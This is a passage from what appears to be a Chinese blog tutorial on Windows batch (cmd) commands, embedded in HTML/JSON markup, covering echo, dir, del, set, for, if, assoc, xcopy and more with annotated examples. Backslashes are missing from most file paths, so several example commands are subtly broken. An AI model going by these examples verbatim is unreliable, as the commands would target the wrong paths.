扩展到驱动器号和路径</span><br><span class=\"line\">%~nx1 - 只将 %1 扩展到文件名和扩展名</span><br><span class=\"line\">%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，</span><br><span class=\"line\">并扩展到找到的第一个文件的驱动器号和路径。</span><br><span class=\"line\">%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。</span><br><span class=\"line\">可以参照 call/? 或 for/? 看出每个参数的含意</span><br><span class=\"line\">echo load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt</span><br><span class=\"line\">生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;</span><br><span class=\"line\">批处理文件里，用这个格式把命令行参数输出到文件</span><br><span class=\"line\"></span><br><span class=\"line\">29 if</span><br><span class=\"line\">判断命令</span><br><span class=\"line\">if &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a</span><br><span class=\"line\">if /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a</span><br><span class=\"line\">/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?</span><br><span class=\"line\">if exist c:test.bat echo 存在c:test.bat文件</span><br><span class=\"line\">if not exist c:windows (</span><br><span class=\"line\">echo 不存在c:windows文件夹</span><br><span class=\"line\">)</span><br><span class=\"line\">if exist c:test.bat (</span><br><span class=\"line\">echo 存在c:test.bat</span><br><span class=\"line\">) else (</span><br><span class=\"line\">echo 不存在c:test.bat</span><br><span class=\"line\">)</span><br><span class=\"line\">30 setlocal 和 endlocal</span><br><span class=\"line\">设置”命令扩展名”和”延缓环境变量扩充”</span><br><span class=\"line\">SETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;</span><br><span class=\"line\">SETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;</span><br><span class=\"line\">SETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;</span><br><span class=\"line\">SETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;</span><br><span class=\"line\">ENDLOCAL #恢复到使用SETLOCAL语句以前的状态</span><br><span class=\"line\">“命令扩展名”默认为启用</span><br><span class=\"line\">“延缓环境变量扩充”默认为停用</span><br><span class=\"line\">批处理结束系统会自动恢复默认值</span><br><span class=\"line\">可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 。所以用到&quot;命令扩展名&quot;的程</span><br><span class=\"line\">序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确</span><br><span class=\"line\">保程序能在其它系统上正确运行</span><br><span class=\"line\">&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令31-39\"><a href=\"#命令31-39\" class=\"headerlink\" title=\"命令31~39\"></a>命令31~39</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">31 set</span><br><span class=\"line\">设置变量</span><br><span class=\"line\">引用变量可在变量名前后加 % ，即 %变量名%</span><br><span class=\"line\">set #显示目前所有可用的变量，包括系统变量和自定义的变量</span><br><span class=\"line\">echo %SystemDrive% #显示系统盘盘符。系统变量可以直接引用</span><br><span class=\"line\">set p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1</span><br><span class=\"line\">set p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2</span><br><span class=\"line\">echo %p% #显示变量p代表的字符串，即aa1bb1aa2bb2</span><br><span class=\"line\">echo %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2</span><br><span class=\"line\">echo %p:~6,3% #显示第6个字符以后的3个字符，即aa2</span><br><span class=\"line\">echo %p:~0,3% #显示前3个字符，即aa1</span><br><span class=\"line\">echo %p:~-2% #显示最后面的2个字符，即b2</span><br><span class=\"line\">echo %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b</span><br><span class=\"line\">echo %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2</span><br><span class=\"line\">echo %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2</span><br><span class=\"line\">echo %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2</span><br><span class=\"line\">set p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2</span><br><span class=\"line\">set /a p=39 #设置p为数值型变量，值为39</span><br><span class=\"line\">set /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3</span><br><span class=\"line\">set /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用</span><br><span class=\"line\">set /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?</span><br><span class=\"line\">set p= #取消p变量</span><br><span class=\"line\">set /p p=请输入</span><br><span class=\"line\">屏幕上显示”请输入”，并会将输入的字符串赋值给变量p</span><br><span class=\"line\">注意这条可以用来取代 choice 命令</span><br><span class=\"line\">注意变量在 if 和 for 的复合语句里是一次性全部替换的，如</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">set p=aaa</span><br><span class=\"line\">if %p%==aaa (</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">set p=bbb</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">)</span><br><span class=\"line\">结果将显示</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">因为在读取 if 语句时已经将所有 %p% 替换为aaa</span><br><span class=\"line\">这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;</span><br><span class=\"line\">可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">SETLOCAL ENABLEDELAYEDEXPANSION</span><br><span class=\"line\">set p=aaa</span><br><span class=\"line\">if %p%==aaa (</span><br><span class=\"line\">echo %p%</span><br><span class=\"line\">set p=bbb</span><br><span class=\"line\">echo !p!</span><br><span class=\"line\">)</span><br><span class=\"line\">ENDLOCAL</span><br><span class=\"line\">结果将显示</span><br><span class=\"line\">aaa</span><br><span class=\"line\">bbb</span><br><span class=\"line\">还有几个动态变量，运行 set 看不到</span><br><span class=\"line\">%CD% #代表当前目录的字符串</span><br><span class=\"line\">%DATE% #当前日期</span><br><span class=\"line\">%TIME% #当前时间</span><br><span class=\"line\">%RANDOM% #随机整数，介于0~32767</span><br><span class=\"line\">%ERRORLEVEL% #当前 ERRORLEVEL 值</span><br><span class=\"line\">%CMDEXTVERSION% #当前命令处理器扩展名版本号</span><br><span class=\"line\">%CMDCMDLINE% #调用命令处理器的原始命令行</span><br><span class=\"line\">可以用echo命令查看每个变量值，如 echo %time%</span><br><span class=\"line\">注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到</span><br><span class=\"line\"></span><br><span class=\"line\">32 start</span><br><span class=\"line\">批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令</span><br><span class=\"line\"></span><br><span class=\"line\">33 call</span><br><span class=\"line\">批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行</span><br><span class=\"line\">有时有的应用程序用start调用出错的，也可以call调用</span><br><span class=\"line\"></span><br><span class=\"line\">34 choice (外部命令)</span><br><span class=\"line\">选择命令</span><br><span class=\"line\">让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……</span><br><span class=\"line\">win98里是choice.com</span><br><span class=\"line\">win2000pro里没有，可以从win98里拷过来</span><br><span class=\"line\">win2003里是choice.exe</span><br><span class=\"line\">choice /N /C y /T 5 /D y&gt;nul</span><br><span class=\"line\">延时5秒</span><br><span class=\"line\"></span><br><span class=\"line\">35 assoc 和 ftype</span><br><span class=\"line\">文件关联</span><br><span class=\"line\">assoc 设置&#x27;文件扩展名&#x27;关联，关联到&#x27;文件类型&#x27;</span><br><span class=\"line\">ftype 设置&#x27;文件类型&#x27;关联，关联到&#x27;执行程序和参数&#x27;</span><br><span class=\"line\">当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开</span><br><span class=\"line\">而是先判断.txt属于 txtfile &#x27;文件类型&#x27;</span><br><span class=\"line\">再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1</span><br><span class=\"line\">可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联</span><br><span class=\"line\">assoc #显示所有&#x27;文件扩展名&#x27;关联</span><br><span class=\"line\">assoc .txt #显示.txt代表的&#x27;文件类型&#x27;，结果显示 .txt=txtfile</span><br><span class=\"line\">assoc .doc #显示.doc代表的&#x27;文件类型&#x27;，结果显示 .doc=Word.Document.8</span><br><span class=\"line\">assoc .exe #显示.exe代表的&#x27;文件类型&#x27;，结果显示 .exe=exefile</span><br><span class=\"line\">ftype #显示所有&#x27;文件类型&#x27;关联</span><br><span class=\"line\">ftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*</span><br><span class=\"line\">assoc .txt=Word.Document.8</span><br><span class=\"line\">设置.txt为word类型的文档，可以看到.txt文件的图标都变了</span><br><span class=\"line\">assoc .txt=txtfile</span><br><span class=\"line\">恢复.txt的正确关联</span><br><span class=\"line\">ftype exefile=&quot;%1&quot; %*</span><br><span class=\"line\">恢复 exefile 的正确关联</span><br><span class=\"line\">如果该关联已经被破坏，可以运行 command.com ，再输入这条命令</span><br><span class=\"line\"></span><br><span class=\"line\">36 pushd 和 popd</span><br><span class=\"line\">切换当前目录</span><br><span class=\"line\">@echo off</span><br><span class=\"line\">c: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹</span><br><span class=\"line\">md d:mp4 #在 D: 建立 mp4 文件夹</span><br><span class=\"line\">cd /d d:mp4 #更改当前目录为 d:mp4</span><br><span class=\"line\">pushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3</span><br><span class=\"line\">popd #恢复当前目录为刚才保存的 d:mp4</span><br><span class=\"line\"></span><br><span class=\"line\">37 for</span><br><span class=\"line\">循环命令</span><br><span class=\"line\">这个比较复杂，请对照 for/? 来看</span><br><span class=\"line\">for %%i in (c: d: e: f:) do echo %%i</span><br><span class=\"line\">依次调用小括号里的每个字符串，执行 do 后面的命令</span><br><span class=\"line\">注意%%i，在批处理中 for 语句调用参数用2个%</span><br><span class=\"line\">默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;</span><br><span class=\"line\">for %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class=\"line\">对当前目录里所有的txt文件执行 find 命令</span><br><span class=\"line\">for /r . %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class=\"line\">在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行</span><br><span class=\"line\">for /r . %%i in (.) do echo %%~pni</span><br><span class=\"line\">显示当前目录名和所有子目录名，包括路径，不包括盘符</span><br><span class=\"line\">for /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt</span><br><span class=\"line\">把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去</span><br><span class=\"line\">for /l %%i in (2,1,8) do echo %%i</span><br><span class=\"line\">生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1</span><br><span class=\"line\">for /f %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class=\"line\">对 set 命令的输出结果循环调用，每行一个</span><br><span class=\"line\">for /f &quot;eol=P&quot; %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class=\"line\">取 set 命令的输出结果，忽略以 P 开头的那几行</span><br><span class=\"line\">for /f %%i in (d:mp3.txt) do echo %%i</span><br><span class=\"line\">显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称</span><br><span class=\"line\">for /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i</span><br><span class=\"line\">显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称</span><br><span class=\"line\">for /f &quot;skip=5 tokens=4&quot; %%a in (&#x27;dir&#x27;) do echo %%a</span><br><span class=\"line\">对 dir 命令的结果，跳过前面5行，余下的每行取第4列</span><br><span class=\"line\">每列之间的分隔符为默认的&quot;空格&quot;</span><br><span class=\"line\">可以注意到 dir 命令输出的前5行是没有文件名的</span><br><span class=\"line\">for /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#x27;date /t&#x27;) do (</span><br><span class=\"line\">echo %%a</span><br><span class=\"line\">echo %%b</span><br><span class=\"line\">echo %%c</span><br><span class=\"line\">)</span><br><span class=\"line\">对 date /t 的输出结果，每行取1、2、3列</span><br><span class=\"line\">第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列</span><br><span class=\"line\">分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;</span><br><span class=\"line\">其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的</span><br><span class=\"line\">for /f &quot;tokens=2* delims=- &quot; %%a in (&#x27;date /t&#x27;) do echo %%b</span><br><span class=\"line\">取第2列给 %%a ，其后的列都给 %%b</span><br><span class=\"line\"></span><br><span class=\"line\">38 subst (外部命令)</span><br><span class=\"line\">映射磁盘。</span><br><span class=\"line\">subst z: serverd #这样输入z:就可以访问serverd了</span><br><span class=\"line\">subst z: /d #取消该映射</span><br><span class=\"line\">subst #显示目前所有的映时</span><br><span class=\"line\"></span><br><span class=\"line\">39 xcopy (外部命令)</span><br><span class=\"line\">文件拷贝</span><br><span class=\"line\">xcopy d:mp3 e:mp3 /s/e/i/y</span><br><span class=\"line\">复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件</span><br><span class=\"line\">加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h1 id=\"bat批处理命令及解释\"><a href=\"#bat批处理命令及解释\" class=\"headerlink\" title=\"bat批处理命令及解释\"></a>bat批处理命令及解释</h1><p><a href=\"https://www.cnblogs.com/xpwi/p/9626959.html\">相关原文链接</a></p>\n<h2 id=\"一、批处理概念\"><a href=\"#一、批处理概念\" class=\"headerlink\" title=\"一、批处理概念\"></a>一、批处理概念</h2><ul>\n<li>批处理文件：包含DOS命令的可编辑可执行文件</li>\n<li>批处理：可以对某一对象批量操作的文件</li>\n</ul>","more":"<h2 id=\"二、批处理命令简介\"><a href=\"#二、批处理命令简介\" class=\"headerlink\" title=\"二、批处理命令简介\"></a>二、批处理命令简介</h2><h3 id=\"命令1-10\"><a href=\"#命令1-10\" class=\"headerlink\" title=\"命令1~10\"></a>命令1~10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 echo 和 @</span><br><span class=\"line\">回显命令</span><br><span class=\"line\">@  #关闭单行回显</span><br><span class=\"line\">echo off  #从下一行开始关闭回显</span><br><span class=\"line\">@echo off  #从本行开始关闭回显。一般批处理第一行都是这个</span><br><span class=\"line\">echo on #从下一行开始打开回显</span><br><span class=\"line\">echo #显示当前是 echo off 状态还是 echo on 状态</span><br><span class=\"line\">echo. #输出一个”回车换行”，空白行</span><br><span class=\"line\">#(同echo, echo; echo+ echo[ echo] echo/ echo)</span><br><span class=\"line\"></span><br><span class=\"line\">2 errorlevel</span><br><span class=\"line\">echo %errorlevel%</span><br><span class=\"line\">每个命令运行结束，可以用这个命令行格式查看返回码</span><br><span class=\"line\">默认值为0，一般命令执行出错会设 errorlevel 为1</span><br><span class=\"line\"></span><br><span class=\"line\">3 dir</span><br><span class=\"line\">显示文件夹内容</span><br><span class=\"line\">dir #显示当前目录中的文件和子目录</span><br><span class=\"line\">dir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件</span><br><span class=\"line\">dir c: /a:d #显示 C 盘当前目录中的目录</span><br><span class=\"line\">dir c: /a:-d #显示 C 盘根目录中的文件</span><br><span class=\"line\">dir c: /b/p #/b只显示文件名，/p分页显示</span><br><span class=\"line\">dir *.exe /s #显示当前目录和子目录里所有的.exe文件</span><br><span class=\"line\"></span><br><span class=\"line\">4 cd</span><br><span class=\"line\">切换目录</span><br><span class=\"line\">cd #进入根目录</span><br><span class=\"line\">cd #显示当前目录</span><br><span class=\"line\">cd /d d:sdk #可以同时更改盘符和目录</span><br><span class=\"line\"></span><br><span class=\"line\">5 md</span><br><span class=\"line\">创建目录</span><br><span class=\"line\">md d:abc #如果 d:a 不存在，将会自动创建中级目录</span><br><span class=\"line\">#如果命令扩展名被停用，则需要键入 mkdir abc</span><br><span class=\"line\"></span><br><span class=\"line\">6 rd</span><br><span class=\"line\">删除目录</span><br><span class=\"line\">rd abc #删除当前目录里的 abc 子目录，要求为空目录</span><br><span class=\"line\">rd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式</span><br><span class=\"line\"></span><br><span class=\"line\">7 del</span><br><span class=\"line\">删除文件</span><br><span class=\"line\">del d:test.txt #删除指定文件，不能是隐藏、系统、只读文件</span><br><span class=\"line\">del /q/a/f d:temp*.*</span><br><span class=\"line\">删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class=\"line\">del /q/a/f/s d:temp*.*</span><br><span class=\"line\">删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class=\"line\"></span><br><span class=\"line\">8 ren</span><br><span class=\"line\">重命名命令</span><br><span class=\"line\">ren d:temp tmp #支持对文件夹的重命名</span><br><span class=\"line\"></span><br><span class=\"line\">9 cls</span><br><span class=\"line\">清屏</span><br><span class=\"line\">10 type</span><br><span class=\"line\">显示文件内容</span><br><span class=\"line\">type c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码</span><br><span class=\"line\">type *.txt #显示当前目录里所有.txt文件的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"命令11-20\"><a href=\"#命令11-20\" class=\"headerlink\" title=\"命令11~20\"></a>命令11~20</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11 copy</span><br><span class=\"line\">拷贝文件</span><br><span class=\"line\">copy c:test.txt d:test.bak</span><br><span class=\"line\">复制 c:test.txt 文件到 d: ，并重命名为 test.bak</span><br><span class=\"line\">copy con test.txt</span><br><span class=\"line\">从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件</span><br><span class=\"line\">con代表屏幕，prn代表打印机，nul代表空设备</span><br><span class=\"line\">copy 1.txt + 2.txt 3.txt</span><br><span class=\"line\">合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件</span><br><span class=\"line\">如果不指定 3.txt ，则保存到 1.txt</span><br><span class=\"line\">copy test.txt +</span><br><span class=\"line\">复制文件到自己，实际上是修改了文件日期</span><br><span class=\"line\"></span><br><span class=\"line\">12 title</span><br><span class=\"line\">设置cmd窗口的标题</span><br><span class=\"line\">title 新标题 #可以看到cmd窗口的标题栏变了</span><br><span class=\"line\"></span><br><span class=\"line\">13 ver</span><br><span class=\"line\">显示系统版本</span><br><span class=\"line\"></span><br><span class=\"line\">14 label 和 vol</span><br><span class=\"line\">设置卷标</span><br><span class=\"line\">vol #显示卷标</span><br><span class=\"line\">label #显示卷标，同时提示输入新卷标</span><br><span class=\"line\">label c:system #设置C盘的卷标为 system</span><br><span class=\"line\"></span><br><span class=\"line\">15 pause</span><br><span class=\"line\">暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束</span><br><span class=\"line\"></span><br><span class=\"line\">16 rem 和 ::</span><br><span class=\"line\">注释命令</span><br><span class=\"line\">注释行不执行操作</span><br><span class=\"line\"></span><br><span class=\"line\">17 date 和 time</span><br><span class=\"line\">日期和时间</span><br><span class=\"line\">date #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入</span><br><span class=\"line\">date/t #只显示当前日期，不提示输入新日期</span><br><span class=\"line\">time #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入</span><br><span class=\"line\">time/t #只显示当前时间，不提示输入新时间</span><br><span class=\"line\"></span><br><span class=\"line\">18 goto 和 :</span><br><span class=\"line\">跳转命令</span><br><span class=\"line\">:label #行首为:表示该行是标签行，标签行不执行操作</span><br><span class=\"line\">goto label #跳转到指定的标签那一行</span><br><span class=\"line\"></span><br><span class=\"line\">19 find (外部命令)</span><br><span class=\"line\">查找命令</span><br><span class=\"line\">find &quot;abc&quot; c:test.txt</span><br><span class=\"line\">在 c:test.txt 文件里查找含 abc 字符串的行</span><br><span class=\"line\">如果找不到，将设 errorlevel 返回码为1</span><br><span class=\"line\">find /i “abc” c:test.txt</span><br><span class=\"line\">查找含 abc 的行，忽略大小写</span><br><span class=\"line\">find /c &quot;abc&quot; c:test.txt</span><br><span class=\"line\">显示含 abc 的行的行数</span><br><span class=\"line\"></span><br><span class=\"line\">20 more (外部命令)</span><br><span class=\"line\">逐屏显示</span><br><span class=\"line\">more c:test.txt #逐屏显示 c:test.txt 的文件内容</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"命令21-30\"><a href=\"#命令21-30\" class=\"headerlink\" title=\"命令21~30\"></a>命令21~30</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 